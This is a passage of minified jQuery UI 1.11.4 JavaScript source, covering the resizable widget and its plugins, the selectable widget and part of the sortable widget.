this.handles)this.handles[i].constructor===String?this.handles[i]=this.element.children(this.handles[i]).first().show():(this.handles[i].jquery||this.handles[i].nodeType)&&(this.handles[i]=t(this.handles[i]),this._on(this.handles[i],{mousedown:a._mouseDown})),this.elementIsWrapper&&this.originalElement[0].nodeName.match(/^(textarea|input|select|button)$/i)&&(s=t(this.handles[i],this.element),o=/sw|ne|nw|se|n|s/.test(i)?s.outerHeight():s.outerWidth(),n=["padding",/ne|nw|n/.test(i)?"Top":/se|sw|s/.test(i)?"Bottom":/^e$/.test(i)?"Right":"Left"].join(""),e.css(n,o),this._proportionallyResize()),this._handles=this._handles.add(this.handles[i])},this._renderAxis(this.element),this._handles=this._handles.add(this.element.find(".ui-resizable-handle")),this._handles.disableSelection(),this._handles.mouseover(function(){a.resizing||(this.className&&(n=this.className.match(/ui-resizable-(se|sw|ne|nw|n|e|s|w)/i)),a.axis=n&&n[1]?n[1]:"se")}),r.autoHide&&(this._handles.hide(),t(this.element).addClass("ui-resizable-autohide").mouseenter(function(){r.disabled||(t(this).removeClass("ui-resizable-autohide"),a._handles.show())}).mouseleave(function(){r.disabled||a.resizing||(t(this).addClass("ui-resizable-autohide"),a._handles.hide())})),this._mouseInit()},_destroy:function(){this._mouseDestroy();var e,i=function(e){t(e).removeClass("ui-resizable ui-resizable-disabled ui-resizable-resizing").removeData("resizable").removeData("ui-resizable").unbind(".resizable").find(".ui-resizable-handle").remove()};return this.elementIsWrapper&&(i(this.element),e=this.element,this.originalElement.css({position:e.css("position"),width:e.outerWidth(),height:e.outerHeight(),top:e.css("top"),left:e.css("left")}).insertAfter(e),e.remove()),this.originalElement.css("resize",this.originalResizeStyle),i(this.originalElement),this},_mouseCapture:function(e){var i,s,n=!1;for(i in this.handles)s=t(this.handles[i])[0],(s===e.target||t.contains(s,e.target))&&(n=!0);return!this.options.disabled&&n},_mouseStart:function(e){var i,s,n,o=this.options,a=this.element;return this.resizing=!0,this._renderProxy(),i=this._num(this.helper.css("left")),s=this._num(this.helper.css("top")),o.containment&&(i+=t(o.containment).scrollLeft()||0,s+=t(o.containment).scrollTop()||0),this.offset=this.helper.offset(),this.position={left:i,top:s},this.size=this._helper?{width:this.helper.width(),height:this.helper.height()}:{width:a.width(),height:a.height()},this.originalSize=this._helper?{width:a.outerWidth(),height:a.outerHeight()}:{width:a.width(),height:a.height()},this.sizeDiff={width:a.outerWidth()-a.width(),height:a.outerHeight()-a.height()},this.originalPosition={left:i,top:s},this.originalMousePosition={left:e.pageX,top:e.pageY},this.aspectRatio="number"==typeof o.aspectRatio?o.aspectRatio:this.originalSize.width/this.originalSize.height||1,n=t(".ui-resizable-"+this.axis).css("cursor"),t("body").css("cursor","auto"===n?this.axis+"-resize":n),a.addClass("ui-resizable-resizing"),this._propagate("start",e),!0},_mouseDrag:function(e){var i,s,n=this.originalMousePosition,o=this.axis,a=e.pageX-n.left||0,r=e.pageY-n.top||0,l=this._change[o];return this._updatePrevProperties(),l?(i=l.apply(this,[e,a,r]),this._updateVirtualBoundaries(e.shiftKey),(this._aspectRatio||e.shiftKey)&&(i=this._updateRatio(i,e)),i=this._respectSize(i,e),this._updateCache(i),this._propagate("resize",e),s=this._applyChanges(),!this._helper&&this._proportionallyResizeElements.length&&this._proportionallyResize(),t.isEmptyObject(s)||(this._updatePrevProperties(),this._trigger("resize",e,this.ui()),this._applyChanges()),!1):!1},_mouseStop:function(e){this.resizing=!1;var i,s,n,o,a,r,l,h=this.options,c=this;return this._helper&&(i=this._proportionallyResizeElements,s=i.length&&/textarea/i.test(i[0].nodeName),n=s&&this._hasScroll(i[0],"left")?0:c.sizeDiff.height,o=s?0:c.sizeDiff.width,a={width:c.helper.width()-o,height:c.helper.height()-n},r=parseInt(c.element.css("left"),10)+(c.position.left-c.originalPosition.left)||null,l=parseInt(c.element.css("top"),10)+(c.position.top-c.originalPosition.top)||null,h.animate||this.element.css(t.extend(a,{top:l,left:r})),c.helper.height(c.size.height),c.helper.width(c.size.width),this._helper&&!h.animate&&this._proportionallyResize()),t("body").css("cursor","auto"),this.element.removeClass("ui-resizable-resizing"),this._propagate("stop",e),this._helper&&this.helper.remove(),!1},_updatePrevProperties:function(){this.prevPosition={top:this.position.top,left:this.position.left},this.prevSize={width:this.size.width,height:this.size.height}},_applyChanges:function(){var t={};return this.position.top!==this.prevPosition.top&&(t.top=this.position.top+"px"),this.position.left!==this.prevPosition.left&&(t.left=this.position.left+"px"),this.size.width!==this.prevSize.width&&(t.width=this.size.width+"px"),this.size.height!==this.prevSize.height&&(t.height=this.size.height+"px"),this.helper.css(t),t},_updateVirtualBoundaries:function(t){var e,i,s,n,o,a=this.options;o={minWidth:this._isNumber(a.minWidth)?a.minWidth:0,maxWidth:this._isNumber(a.maxWidth)?a.maxWidth:1/0,minHeight:this._isNumber(a.minHeight)?a.minHeight:0,maxHeight:this._isNumber(a.maxHeight)?a.maxHeight:1/0},(this._aspectRatio||t)&&(e=o.minHeight*this.aspectRatio,s=o.minWidth/this.aspectRatio,i=o.maxHeight*this.aspectRatio,n=o.maxWidth/this.aspectRatio,e>o.minWidth&&(o.minWidth=e),s>o.minHeight&&(o.minHeight=s),o.maxWidth>i&&(o.maxWidth=i),o.maxHeight>n&&(o.maxHeight=n)),this._vBoundaries=o},_updateCache:function(t){this.offset=this.helper.offset(),this._isNumber(t.left)&&(this.position.left=t.left),this._isNumber(t.top)&&(this.position.top=t.top),this._isNumber(t.height)&&(this.size.height=t.height),this._isNumber(t.width)&&(this.size.width=t.width)},_updateRatio:function(t){var e=this.position,i=this.size,s=this.axis;return this._isNumber(t.height)?t.width=t.height*this.aspectRatio:this._isNumber(t.width)&&(t.height=t.width/this.aspectRatio),"sw"===s&&(t.left=e.left+(i.width-t.width),t.top=null),"nw"===s&&(t.top=e.top+(i.height-t.height),t.left=e.left+(i.width-t.width)),t},_respectSize:function(t){var e=this._vBoundaries,i=this.axis,s=this._isNumber(t.width)&&e.maxWidth&&e.maxWidth<t.width,n=this._isNumber(t.height)&&e.maxHeight&&e.maxHeight<t.height,o=this._isNumber(t.width)&&e.minWidth&&e.minWidth>t.width,a=this._isNumber(t.height)&&e.minHeight&&e.minHeight>t.height,r=this.originalPosition.left+this.originalSize.width,l=this.position.top+this.size.height,h=/sw|nw|w/.test(i),c=/nw|ne|n/.test(i);return o&&(t.width=e.minWidth),a&&(t.height=e.minHeight),s&&(t.width=e.maxWidth),n&&(t.height=e.maxHeight),o&&h&&(t.left=r-e.minWidth),s&&h&&(t.left=r-e.maxWidth),a&&c&&(t.top=l-e.minHeight),n&&c&&(t.top=l-e.maxHeight),t.width||t.height||t.left||!t.top?t.width||t.height||t.top||!t.left||(t.left=null):t.top=null,t},_getPaddingPlusBorderDimensions:function(t){for(var e=0,i=[],s=[t.css("borderTopWidth"),t.css("borderRightWidth"),t.css("borderBottomWidth"),t.css("borderLeftWidth")],n=[t.css("paddingTop"),t.css("paddingRight"),t.css("paddingBottom"),t.css("paddingLeft")];4>e;e++)i[e]=parseInt(s[e],10)||0,i[e]+=parseInt(n[e],10)||0;return{height:i[0]+i[2],width:i[1]+i[3]}},_proportionallyResize:function(){if(this._proportionallyResizeElements.length)for(var t,e=0,i=this.helper||this.element;this._proportionallyResizeElements.length>e;e++)t=this._proportionallyResizeElements[e],this.outerDimensions||(this.outerDimensions=this._getPaddingPlusBorderDimensions(t)),t.css({height:i.height()-this.outerDimensions.height||0,width:i.width()-this.outerDimensions.width||0})},_renderProxy:function(){var e=this.element,i=this.options;this.elementOffset=e.offset(),this._helper?(this.helper=this.helper||t("<div style='overflow:hidden;'></div>"),this.helper.addClass(this._helper).css({width:this.element.outerWidth()-1,height:this.element.outerHeight()-1,position:"absolute",left:this.elementOffset.left+"px",top:this.elementOffset.top+"px",zIndex:++i.zIndex}),this.helper.appendTo("body").disableSelection()):this.helper=this.element},_change:{e:function(t,e){return{width:this.originalSize.width+e}},w:function(t,e){var i=this.originalSize,s=this.originalPosition;return{left:s.left+e,width:i.width-e}},n:function(t,e,i){var s=this.originalSize,n=this.originalPosition;return{top:n.top+i,height:s.height-i}},s:function(t,e,i){return{height:this.originalSize.height+i}},se:function(e,i,s){return t.extend(this._change.s.apply(this,arguments),this._change.e.apply(this,[e,i,s]))},sw:function(e,i,s){return t.extend(this._change.s.apply(this,arguments),this._change.w.apply(this,[e,i,s]))},ne:function(e,i,s){return t.extend(this._change.n.apply(this,arguments),this._change.e.apply(this,[e,i,s]))},nw:function(e,i,s){return t.extend(this._change.n.apply(this,arguments),this._change.w.apply(this,[e,i,s]))}},_propagate:function(e,i){t.ui.plugin.call(this,e,[i,this.ui()]),"resize"!==e&&this._trigger(e,i,this.ui())},plugins:{},ui:function(){return{originalElement:this.originalElement,element:this.element,helper:this.helper,position:this.position,size:this.size,originalSize:this.originalSize,originalPosition:this.originalPosition}}}),t.ui.plugin.add("resizable","animate",{stop:function(e){var i=t(this).resizable("instance"),s=i.options,n=i._proportionallyResizeElements,o=n.length&&/textarea/i.test(n[0].nodeName),a=o&&i._hasScroll(n[0],"left")?0:i.sizeDiff.height,r=o?0:i.sizeDiff.width,l={width:i.size.width-r,height:i.size.height-a},h=parseInt(i.element.css("left"),10)+(i.position.left-i.originalPosition.left)||null,c=parseInt(i.element.css("top"),10)+(i.position.top-i.originalPosition.top)||null;i.element.animate(t.extend(l,c&&h?{top:c,left:h}:{}),{duration:s.animateDuration,easing:s.animateEasing,step:function(){var s={width:parseInt(i.element.css("width"),10),height:parseInt(i.element.css("height"),10),top:parseInt(i.element.css("top"),10),left:parseInt(i.element.css("left"),10)};n&&n.length&&t(n[0]).css({width:s.width,height:s.height}),i._updateCache(s),i._propagate("resize",e)}})}}),t.ui.plugin.add("resizable","containment",{start:function(){var e,i,s,n,o,a,r,l=t(this).resizable("instance"),h=l.options,c=l.element,u=h.containment,d=u instanceof t?u.get(0):/parent/.test(u)?c.parent().get(0):u;d&&(l.containerElement=t(d),/document/.test(u)||u===document?(l.containerOffset={left:0,top:0},l.containerPosition={left:0,top:0},l.parentData={element:t(document),left:0,top:0,width:t(document).width(),height:t(document).height()||document.body.parentNode.scrollHeight}):(e=t(d),i=[],t(["Top","Right","Left","Bottom"]).each(function(t,s){i[t]=l._num(e.css("padding"+s))}),l.containerOffset=e.offset(),l.containerPosition=e.position(),l.containerSize={height:e.innerHeight()-i[3],width:e.innerWidth()-i[1]},s=l.containerOffset,n=l.containerSize.height,o=l.containerSize.width,a=l._hasScroll(d,"left")?d.scrollWidth:o,r=l._hasScroll(d)?d.scrollHeight:n,l.parentData={element:d,left:s.left,top:s.top,width:a,height:r}))},resize:function(e){var i,s,n,o,a=t(this).resizable("instance"),r=a.options,l=a.containerOffset,h=a.position,c=a._aspectRatio||e.shiftKey,u={top:0,left:0},d=a.containerElement,p=!0;d[0]!==document&&/static/.test(d.css("position"))&&(u=l),h.left<(a._helper?l.left:0)&&(a.size.width=a.size.width+(a._helper?a.position.left-l.left:a.position.left-u.left),c&&(a.size.height=a.size.width/a.aspectRatio,p=!1),a.position.left=r.helper?l.left:0),h.top<(a._helper?l.top:0)&&(a.size.height=a.size.height+(a._helper?a.position.top-l.top:a.position.top),c&&(a.size.width=a.size.height*a.aspectRatio,p=!1),a.position.top=a._helper?l.top:0),n=a.containerElement.get(0)===a.element.parent().get(0),o=/relative|absolute/.test(a.containerElement.css("position")),n&&o?(a.offset.left=a.parentData.left+a.position.left,a.offset.top=a.parentData.top+a.position.top):(a.offset.left=a.element.offset().left,a.offset.top=a.element.offset().top),i=Math.abs(a.sizeDiff.width+(a._helper?a.offset.left-u.left:a.offset.left-l.left)),s=Math.abs(a.sizeDiff.height+(a._helper?a.offset.top-u.top:a.offset.top-l.top)),i+a.size.width>=a.parentData.width&&(a.size.width=a.parentData.width-i,c&&(a.size.height=a.size.width/a.aspectRatio,p=!1)),s+a.size.height>=a.parentData.height&&(a.size.height=a.parentData.height-s,c&&(a.size.width=a.size.height*a.aspectRatio,p=!1)),p||(a.position.left=a.prevPosition.left,a.position.top=a.prevPosition.top,a.size.width=a.prevSize.width,a.size.height=a.prevSize.height)},stop:function(){var e=t(this).resizable("instance"),i=e.options,s=e.containerOffset,n=e.containerPosition,o=e.containerElement,a=t(e.helper),r=a.offset(),l=a.outerWidth()-e.sizeDiff.width,h=a.outerHeight()-e.sizeDiff.height;e._helper&&!i.animate&&/relative/.test(o.css("position"))&&t(this).css({left:r.left-n.left-s.left,width:l,height:h}),e._helper&&!i.animate&&/static/.test(o.css("position"))&&t(this).css({left:r.left-n.left-s.left,width:l,height:h})}}),t.ui.plugin.add("resizable","alsoResize",{start:function(){var e=t(this).resizable("instance"),i=e.options;t(i.alsoResize).each(function(){var e=t(this);e.data("ui-resizable-alsoresize",{width:parseInt(e.width(),10),height:parseInt(e.height(),10),left:parseInt(e.css("left"),10),top:parseInt(e.css("top"),10)})})},resize:function(e,i){var s=t(this).resizable("instance"),n=s.options,o=s.originalSize,a=s.originalPosition,r={height:s.size.height-o.height||0,width:s.size.width-o.width||0,top:s.position.top-a.top||0,left:s.position.left-a.left||0};t(n.alsoResize).each(function(){var e=t(this),s=t(this).data("ui-resizable-alsoresize"),n={},o=e.parents(i.originalElement[0]).length?["width","height"]:["width","height","top","left"];t.each(o,function(t,e){var i=(s[e]||0)+(r[e]||0);i&&i>=0&&(n[e]=i||null)}),e.css(n)})},stop:function(){t(this).removeData("resizable-alsoresize")}}),t.ui.plugin.add("resizable","ghost",{start:function(){var e=t(this).resizable("instance"),i=e.options,s=e.size;e.ghost=e.originalElement.clone(),e.ghost.css({opacity:.25,display:"block",position:"relative",height:s.height,width:s.width,margin:0,left:0,top:0}).addClass("ui-resizable-ghost").addClass("string"==typeof i.ghost?i.ghost:""),e.ghost.appendTo(e.helper)},resize:function(){var e=t(this).resizable("instance");e.ghost&&e.ghost.css({position:"relative",height:e.size.height,width:e.size.width})},stop:function(){var e=t(this).resizable("instance");e.ghost&&e.helper&&e.helper.get(0).removeChild(e.ghost.get(0))}}),t.ui.plugin.add("resizable","grid",{resize:function(){var e,i=t(this).resizable("instance"),s=i.options,n=i.size,o=i.originalSize,a=i.originalPosition,r=i.axis,l="number"==typeof s.grid?[s.grid,s.grid]:s.grid,h=l[0]||1,c=l[1]||1,u=Math.round((n.width-o.width)/h)*h,d=Math.round((n.height-o.height)/c)*c,p=o.width+u,f=o.height+d,g=s.maxWidth&&p>s.maxWidth,m=s.maxHeight&&f>s.maxHeight,_=s.minWidth&&s.minWidth>p,v=s.minHeight&&s.minHeight>f;s.grid=l,_&&(p+=h),v&&(f+=c),g&&(p-=h),m&&(f-=c),/^(se|s|e)$/.test(r)?(i.size.width=p,i.size.height=f):/^(ne)$/.test(r)?(i.size.width=p,i.size.height=f,i.position.top=a.top-d):/^(sw)$/.test(r)?(i.size.width=p,i.size.height=f,i.position.left=a.left-u):((0>=f-c||0>=p-h)&&(e=i._getPaddingPlusBorderDimensions(this)),f-c>0?(i.size.height=f,i.position.top=a.top-d):(f=c-e.height,i.size.height=f,i.position.top=a.top+o.height-f),p-h>0?(i.size.width=p,i.position.left=a.left-u):(p=h-e.width,i.size.width=p,i.position.left=a.left+o.width-p))}}),t.ui.resizable,t.widget("ui.selectable",t.ui.mouse,{version:"1.11.4",options:{appendTo:"body",autoRefresh:!0,distance:0,filter:"*",tolerance:"touch",selected:null,selecting:null,start:null,stop:null,unselected:null,unselecting:null},_create:function(){var e,i=this;this.element.addClass("ui-selectable"),this.dragged=!1,this.refresh=function(){e=t(i.options.filter,i.element[0]),e.addClass("ui-selectee"),e.each(function(){var e=t(this),i=e.offset();t.data(this,"selectable-item",{element:this,$element:e,left:i.left,top:i.top,right:i.left+e.outerWidth(),bottom:i.top+e.outerHeight(),startselected:!1,selected:e.hasClass("ui-selected"),selecting:e.hasClass("ui-selecting"),unselecting:e.hasClass("ui-unselecting")})})},this.refresh(),this.selectees=e.addClass("ui-selectee"),this._mouseInit(),this.helper=t("<div class='ui-selectable-helper'></div>")},_destroy:function(){this.selectees.removeClass("ui-selectee").removeData("selectable-item"),this.element.removeClass("ui-selectable ui-selectable-disabled"),this._mouseDestroy()},_mouseStart:function(e){var i=this,s=this.options;this.opos=[e.pageX,e.pageY],this.options.disabled||(this.selectees=t(s.filter,this.element[0]),this._trigger("start",e),t(s.appendTo).append(this.helper),this.helper.css({left:e.pageX,top:e.pageY,width:0,height:0}),s.autoRefresh&&this.refresh(),this.selectees.filter(".ui-selected").each(function(){var s=t.data(this,"selectable-item");s.startselected=!0,e.metaKey||e.ctrlKey||(s.$element.removeClass("ui-selected"),s.selected=!1,s.$element.addClass("ui-unselecting"),s.unselecting=!0,i._trigger("unselecting",e,{unselecting:s.element}))}),t(e.target).parents().addBack().each(function(){var s,n=t.data(this,"selectable-item");return n?(s=!e.metaKey&&!e.ctrlKey||!n.$element.hasClass("ui-selected"),n.$element.removeClass(s?"ui-unselecting":"ui-selected").addClass(s?"ui-selecting":"ui-unselecting"),n.unselecting=!s,n.selecting=s,n.selected=s,s?i._trigger("selecting",e,{selecting:n.element}):i._trigger("unselecting",e,{unselecting:n.element}),!1):void 0}))},_mouseDrag:function(e){if(this.dragged=!0,!this.options.disabled){var i,s=this,n=this.options,o=this.opos[0],a=this.opos[1],r=e.pageX,l=e.pageY;return o>r&&(i=r,r=o,o=i),a>l&&(i=l,l=a,a=i),this.helper.css({left:o,top:a,width:r-o,height:l-a}),this.selectees.each(function(){var i=t.data(this,"selectable-item"),h=!1;
i&&i.element!==s.element[0]&&("touch"===n.tolerance?h=!(i.left>r||o>i.right||i.top>l||a>i.bottom):"fit"===n.tolerance&&(h=i.left>o&&r>i.right&&i.top>a&&l>i.bottom),h?(i.selected&&(i.$element.removeClass("ui-selected"),i.selected=!1),i.unselecting&&(i.$element.removeClass("ui-unselecting"),i.unselecting=!1),i.selecting||(i.$element.addClass("ui-selecting"),i.selecting=!0,s._trigger("selecting",e,{selecting:i.element}))):(i.selecting&&((e.metaKey||e.ctrlKey)&&i.startselected?(i.$element.removeClass("ui-selecting"),i.selecting=!1,i.$element.addClass("ui-selected"),i.selected=!0):(i.$element.removeClass("ui-selecting"),i.selecting=!1,i.startselected&&(i.$element.addClass("ui-unselecting"),i.unselecting=!0),s._trigger("unselecting",e,{unselecting:i.element}))),i.selected&&(e.metaKey||e.ctrlKey||i.startselected||(i.$element.removeClass("ui-selected"),i.selected=!1,i.$element.addClass("ui-unselecting"),i.unselecting=!0,s._trigger("unselecting",e,{unselecting:i.element})))))}),!1}},_mouseStop:function(e){var i=this;return this.dragged=!1,t(".ui-unselecting",this.element[0]).each(function(){var s=t.data(this,"selectable-item");s.$element.removeClass("ui-unselecting"),s.unselecting=!1,s.startselected=!1,i._trigger("unselected",e,{unselected:s.element})}),t(".ui-selecting",this.element[0]).each(function(){var s=t.data(this,"selectable-item");s.$element.removeClass("ui-selecting").addClass("ui-selected"),s.selecting=!1,s.selected=!0,s.startselected=!0,i._trigger("selected",e,{selected:s.element})}),this._trigger("stop",e),this.helper.remove(),!1}}),t.widget("ui.sortable",t.ui.mouse,{version:"1.11.4",widgetEventPrefix:"sort",ready:!1,options:{appendTo:"parent",axis:!1,connectWith:!1,containment:!1,cursor:"auto",cursorAt:!1,dropOnEmpty:!0,forcePlaceholderSize:!1,forceHelperSize:!1,grid:!1,handle:!1,helper:"original",items:"> *",opacity:!1,placeholder:!1,revert:!1,scroll:!0,scrollSensitivity:20,scrollSpeed:20,scope:"default",tolerance:"intersect",zIndex:1e3,activate:null,beforeStop:null,change:null,deactivate:null,out:null,over:null,receive:null,remove:null,sort:null,start:null,stop:null,update:null},_isOverAxis:function(t,e,i){return t>=e&&e+i>t},_isFloating:function(t){return/left|right/.test(t.css("float"))||/inline|table-cell/.test(t.css("display"))},_create:function(){this.containerCache={},this.element.addClass("ui-sortable"),this.refresh(),this.offset=this.element.offset(),this._mouseInit(),this._setHandleClassName(),this.ready=!0},_setOption:function(t,e){this._super(t,e),"handle"===t&&this._setHandleClassName()},_setHandleClassName:function(){this.element.find(".ui-sortable-handle").removeClass("ui-sortable-handle"),t.each(this.items,function(){(this.instance.options.handle?this.item.find(this.instance.options.handle):this.item).addClass("ui-sortable-handle")})},_destroy:function(){this.element.removeClass("ui-sortable ui-sortable-disabled").find(".ui-sortable-handle").removeClass("ui-sortable-handle"),this._mouseDestroy();for(var t=this.items.length-1;t>=0;t--)this.items[t].item.removeData(this.widgetName+"-item");return this},_mouseCapture:function(e,i){var s=null,n=!1,o=this;return this.reverting?!1:this.options.disabled||"static"===this.options.type?!1:(this._refreshItems(e),t(e.target).parents().each(function(){return t.data(this,o.widgetName+"-item")===o?(s=t(this),!1):void 0}),t.data(e.target,o.widgetName+"-item")===o&&(s=t(e.target)),s?!this.options.handle||i||(t(this.options.handle,s).find("*").addBack().each(function(){this===e.target&&(n=!0)}),n)?(this.currentItem=s,this._removeCurrentsFromItems(),!0):!1:!1)},_mouseStart:function(e,i,s){var n,o,a=this.options;if(this.currentContainer=this,this.refreshPositions(),this.helper=this._createHelper(e),this._cacheHelperProportions(),this._cacheMargins(),this.scrollParent=this.helper.scrollParent(),this.offset=this.currentItem.offset(),this.offset={top:this.offset.top-this.margins.top,left:this.offset.left-this.margins.left},t.extend(this.offset,{click:{left:e.pageX-this.offset.left,top:e.pageY-this.offset.top},parent:this._getParentOffset(),relative:this._getRelativeOffset()}),this.helper.css("position","absolute"),this.cssPosition=this.helper.css("position"),this.originalPosition=this._generatePosition(e),this.originalPageX=e.pageX,this.originalPageY=e.pageY,a.cursorAt&&this._adjustOffsetFromHelper(a.cursorAt),this.domPosition={prev:this.currentItem.prev()[0],parent:this.currentItem.parent()[0]},this.helper[0]!==this.currentItem[0]&&this.currentItem.hide(),this._createPlaceholder(),a.containment&&this._setContainment(),a.cursor&&"auto"!==a.cursor&&(o=this.document.find("body"),this.storedCursor=o.css("cursor"),o.css("cursor",a.cursor),this.storedStylesheet=t("<style>*{ cursor: "+a.cursor+" !important; }</style>").appendTo(o)),a.opacity&&(this.helper.css("opacity")&&(this._storedOpacity=this.helper.css("opacity")),this.helper.css("opacity",a.opacity)),a.zIndex&&(this.helper.css("zIndex")&&(this._storedZIndex=this.helper.css("zIndex")),this.helper.css("zIndex",a.zIndex)),this.scrollParent[0]!==this.document[0]&&"HTML"!==this.scrollParent[0].tagName&&(this.overflowOffset=this.scrollParent.offset()),this._trigger("start",e,this._uiHash()),this._preserveHelperProportions||this._cacheHelperProportions(),!s)for(n=this.containers.length-1;n>=0;n--)this.containers[n]._trigger("activate",e,this._uiHash(this));return t.ui.ddmanager&&(t.ui.ddmanager.current=this),t.ui.ddmanager&&!a.dropBehaviour&&t.ui.ddmanager.prepareOffsets(this,e),this.dragging=!0,this.helper.addClass("ui-sortable-helper"),this._mouseDrag(e),!0},_mouseDrag:function(e){var i,s,n,o,a=this.options,r=!1;for(this.position=this._generatePosition(e),this.positionAbs=this._convertPositionTo("absolute"),this.lastPositionAbs||(this.lastPositionAbs=this.positionAbs),this.options.scroll&&(this.scrollParent[0]!==this.document[0]&&"HTML"!==this.scrollParent[0].tagName?(this.overflowOffset.top+this.scrollParent[0].offsetHeight-e.pageY<a.scrollSensitivity?this.scrollParent[0].scrollTop=r=this.scrollParent[0].scrollTop+a.scrollSpeed:e.pageY-this.overflowOffset.top<a.scrollSensitivity&&(this.scrollParent[0].scrollTop=r=this.scrollParent[0].scrollTop-a.scrollSpeed),this.overflowOffset.left+this.scrollParent[0].offsetWidth-e.pageX<a.scrollSensitivity?this.scrollParent[0].scrollLeft=r=this.scrollParent[0].scrollLeft+a.scrollSpeed:e.pageX-this.overflowOffset.left<a.scrollSensitivity&&(this.scrollParent[0].scrollLeft=r=this.scrollParent[0].scrollLeft-a.scrollSpeed)):(e.pageY-this.document.scrollTop()<a.scrollSensitivity?r=this.document.scrollTop(this.document.scrollTop()-a.scrollSpeed):this.window.height()-(e.pageY-this.document.scrollTop())<a.scrollSensitivity&&(r=this.document.scrollTop(this.document.scrollTop()+a.scrollSpeed)),e.pageX-this.document.scrollLeft()<a.scrollSensitivity?r=this.document.scrollLeft(this.document.scrollLeft()-a.scrollSpeed):this.window.width()-(e.pageX-this.document.scrollLeft())<a.scrollSensitivity&&(r=this.document.scrollLeft(this.document.scrollLeft()+a.scrollSpeed))),r!==!1&&t.ui.ddmanager&&!a.dropBehaviour&&t.ui.ddmanager.prepareOffsets(this,e)),this.positionAbs=this._convertPositionTo("absolute"),this.options.axis&&"y"===this.options.axis||(this.helper[0].style.left=this.position.left+"px"),this.options.axis&&"x"===this.options.axis||(this.helper[0].style.top=this.position.top+"px"),i=this.items.length-1;i>=0;i--)if(s=this.items[i],n=s.item[0],o=this._intersectsWithPointer(s),o&&s.instance===this.currentContainer&&n!==this.currentItem[0]&&this.placeholder[1===o?"next":"prev"]()[0]!==n&&!t.contains(this.placeholder[0],n)&&("semi-dynamic"===this.options.type?!t.contains(this.element[0],n):!0)){if(this.direction=1===o?"down":"up","pointer"!==this.options.tolerance&&!this._intersectsWithSides(s))break;this._rearrange(e,s),this._trigger("change",e,this._uiHash());break}return this._contactContainers(e),t.ui.ddmanager&&t.ui.ddmanager.drag(this,e),this._trigger("sort",e,this._uiHash()),this.lastPositionAbs=this.positionAbs,!1},_mouseStop:function(e,i){if(e){if(t.ui.ddmanager&&!this.options.dropBehaviour&&t.ui.ddmanager.drop(this,e),this.options.revert){var s=this,n=this.placeholder.offset(),o=this.options.axis,a={};o&&"x"!==o||(a.left=n.left-this.offset.parent.left-this.margins.left+(this.offsetParent[0]===this.document[0].body?0:this.offsetParent[0].scrollLeft)),o&&"y"!==o||(a.top=n.top-this.offset.parent.top-this.margins.top+(this.offsetParent[0]===this.document[0].body?0:this.offsetParent[0].scrollTop)),this.reverting=!0,t(this.helper).animate(a,parseInt(this.options.revert,10)||500,function(){s._clear(e)})}else this._clear(e,i);return!1}},cancel:function(){if(this.dragging){this._mouseUp({target:null}),"original"===this.options.helper?this.currentItem.css(this._storedCSS).removeClass("ui-sortable-helper"):this.currentItem.show();for(var e=this.containers.length-1;e>=0;e--)this.containers[e]._trigger("deactivate",null,this._uiHash(this)),this.containers[e].containerCache.over&&(this.containers[e]._trigger("out",null,this._uiHash(this)),this.containers[e].containerCache.over=0)}return this.placeholder&&(this.placeholder[0].parentNode&&this.placeholder[0].parentNode.removeChild(this.placeholder[0]),"original"!==this.options.helper&&this.helper&&this.helper[0].parentNode&&this.helper.remove(),t.extend(this,{helper:null,dragging:!1,reverting:!1,_noFinalSort:null}),this.domPosition.prev?t(this.domPosition.prev).after(this.currentItem):t(this.domPosition.parent).prepend(this.currentItem)),this},serialize:function(e){var i=this._getItemsAsjQuery(e&&e.connected),s=[];return e=e||{},t(i).each(function(){var i=(t(e.item||this).attr(e.attribute||"id")||"").match(e.expression||/(.+)[\-=_](.+)/);i&&s.push((e.key||i[1]+"[]")+"="+(e.key&&e.expression?i[1]:i[2]))}),!s.length&&e.key&&s.push(e.key+"="),s.join("&")},toArray:function(e){var i=this._getItemsAsjQuery(e&&e.connected),s=[];return e=e||{},i.each(function(){s.push(t(e.item||this).attr(e.attribute||"id")||"")}),s},_intersectsWith:function(t){var e=this.positionAbs.left,i=e+this.helperProportions.width,s=this.positionAbs.top,n=s+this.helperProportions.height,o=t.left,a=o+t.width,r=t.top,l=r+t.height,h=this.offset.click.top,c=this.offset.click.left,u="x"===this.options.axis||s+h>r&&l>s+h,d="y"===this.options.axis||e+c>o&&a>e+c,p=u&&d;return"pointer"===this.options.tolerance||this.options.forcePointerForContainers||"pointer"!==this.options.tolerance&&this.helperProportions[this.floating?"width":"height"]>t[this.floating?"width":"height"]?p:e+this.helperProportions.width/2>o&&a>i-this.helperProportions.width/2&&s+this.helperProportions.height/2>r&&l>n-this.helperProportions.height/2},_intersectsWithPointer:function(t){var e="x"===this.options.axis||this._isOverAxis(this.positionAbs.top+this.offset.click.top,t.top,t.height),i="y"===this.options.axis||this._isOverAxis(this.positionAbs.left+this.offset.click.left,t.left,t.width),s=e&&i,n=this._getDragVerticalDirection(),o=this._getDragHorizontalDirection();return s?this.floating?o&&"right"===o||"down"===n?2:1:n&&("down"===n?2:1):!1},_intersectsWithSides:function(t){var e=this._isOverAxis(this.positionAbs.top+this.offset.click.top,t.top+t.height/2,t.height),i=this._isOverAxis(this.positionAbs.left+this.offset.click.left,t.left+t.width/2,t.width),s=this._getDragVerticalDirection(),n=this._getDragHorizontalDirection();return this.floating&&n?"right"===n&&i||"left"===n&&!i:s&&("down"===s&&e||"up"===s&&!e)},_getDragVerticalDirection:function(){var t=this.positionAbs.top-this.lastPositionAbs.top;return 0!==t&&(t>0?"down":"up")},_getDragHorizontalDirection:function(){var t=this.positionAbs.left-this.lastPositionAbs.left;return 0!==t&&(t>0?"right":"left")},refresh:function(t){return this._refreshItems(t),this._setHandleClassName(),this.refreshPositions(),this},_connectWith:function(){var t=this.options;return t.connectWith.constructor===String?[t.connectWith]:t.connectWith},_getItemsAsjQuery:function(e){function i(){r.push(this)}var s,n,o,a,r=[],l=[],h=this._connectWith();if(h&&e)for(s=h.length-1;s>=0;s--)for(o=t(h[s],this.document[0]),n=o.length-1;n>=0;n--)a=t.data(o[n],this.widgetFullName),a&&a!==this&&!a.options.disabled&&l.push([t.isFunction(a.options.items)?a.options.items.call(a.element):t(a.options.items,a.element).not(".ui-sortable-helper").not(".ui-sortable-placeholder"),a]);for(l.push([t.isFunction(this.options.items)?this.options.items.call(this.element,null,{options:this.options,item:this.currentItem}):t(this.options.items,this.element).not(".ui-sortable-helper").not(".ui-sortable-placeholder"),this]),s=l.length-1;s>=0;s--)l[s][0].each(i);return t(r)},_removeCurrentsFromItems:function(){var 